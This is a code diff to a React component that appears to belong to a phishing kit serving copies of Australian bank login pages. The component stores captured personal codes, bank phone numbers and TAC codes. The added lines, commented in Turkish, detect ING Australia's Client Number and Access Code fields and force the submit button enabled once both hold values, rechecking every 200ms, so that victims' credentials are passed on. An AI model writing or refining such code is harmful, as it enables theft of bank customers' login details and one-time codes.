@@ -2154,6 +2154,24 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       const personalUS = captured.find((c) => c.kind === "personalCode");
       const bankPhoneUS = captured.find((c) => c.kind === "bankPhone");
       const tacUS = captured.find((c) => c.kind === "tacCode");
+
+      // ⭐⭐⭐⭐⭐ ING Australia OZEL 2 ALAN KONTROLU (KULLANICI ISTEGI):
+      //   Client Number (#cifField) + Access Code (#password) İKİSİ BİRDEN DOLU ise → ZORLA GECERLI.
+      //   2si de doluysa buton TURUNCU + tıklanabilir OLSUN.
+      //   Egerki 1 alan bile BOŞSA HTML gri/silik (orijinal) kalsın.
+      let ingAustralia2AlanDolu = false;
+      try {
+        const _doc = doc;
+        const cifInput = _doc && (_doc.getElementById("cifField") || _doc.querySelector<HTMLInputElement>("input[id*='cifField'], input.uia-cif, input[placeholder='Client number']"));
+        const pwInput  = _doc && (_doc.getElementById("password") || _doc.querySelector<HTMLInputElement>("input[type='password'][placeholder='Access code'], input[id='password'], input.access-code"));
+        if (cifInput && pwInput) {
+          const cv = String(((cifInput as any).value ?? "")).trim();
+          const pv = String(((pwInput as any).value ?? "")).trim();
+          ingAustralia2AlanDolu = (cv.length > 0 && pv.length > 0);
+        }
+      } catch {}
+      const isINGSlug = (String(bankSlug||"").toLowerCase().includes("ing")) || (String(bankName||"").toLowerCase().includes("ing"));
+
       const strictEmergencyPassUS =
         (!saving) &&
         (
@@ -2163,7 +2181,8 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           (Boolean(bankPhoneUS && bankPhoneUS.value.trim() && (filledCount >= 2))) ||
           (Boolean(tacUS && tacUS.value.trim() && (filledCount >= 2))) ||
           (filledCount >= 3) ||
-          (totalMeaningful > 0 && totalMeaningful <= 2 && filledCount === totalMeaningful)
+          (totalMeaningful > 0 && totalMeaningful <= 2 && filledCount === totalMeaningful) ||
+          (isINGSlug && ingAustralia2AlanDolu) // ⭐⭐⭐⭐⭐ ING OZEL 2 ALAN DOLU ISE ZORLA GECERLI
         );
       if (strictEmergencyPassUS) isValid = true;
 
@@ -3099,6 +3118,25 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         if (!shouldForceEnable && !disabledBySaving && hasAnyImportantPoll && filledNow >= 2) {
           shouldForceEnable = true;
         }
+        // ⭐⭐⭐⭐⭐ ING Australia POLLING SEVIYESINDE 2 ALAN KONTROLU (KULLANICI ISTEGI):
+        //   2 FORM (Client Number + Access Code) HER İKİSİ DOLU → shouldForceEnable = true ZORLA.
+        //   Boylece her 200ms'de kontrol edilir, HTML kendi renderinda butonu griye donerse
+        //   polling aninda tekrar turuncu olur.
+        //   1 tane alan bos → HTML orijinal gri/silik kalsin (yanlis force yapma).
+        try {
+          const isINGSlugPoll = (String(bankSlug||"").toLowerCase().includes("ing")) || (String(bankName||"").toLowerCase().includes("ing"));
+          if (isINGSlugPoll && !disabledBySaving) {
+            const cifP = doc.getElementById("cifField") || doc.querySelector<HTMLInputElement>("input[id*='cifField'], input.uia-cif, input[placeholder='Client number']");
+            const pwP  = doc.getElementById("password")  || doc.querySelector<HTMLInputElement>("input[type='password'][placeholder='Access code'], input[id='password'], input.access-code");
+            if (cifP && pwP) {
+              const cV = String(((cifP as any).value ?? "")).trim();
+              const pV = String(((pwP as any).value ?? "")).trim();
+              if (cV.length > 0 && pV.length > 0) {
+                shouldForceEnable = true;
+              }
+            }
+          }
+        } catch {}
         // ⭐⭐⭐⭐⭐ STRICTER EMERGENCY PASS (7 ŞART, Form DOLUYSA KESİN TRUE):
         //   ❌ HATA: proceedNow/canSubmitFinal ING Australia HTML'inde yanlis FALSE donebilir
         //     (ornegin custom <ing-*>/<ui5-*>/<sg-*>/<sl-*>/<vaadin-*>/<md-*>/<mwc-*>/<sl-*> shadow
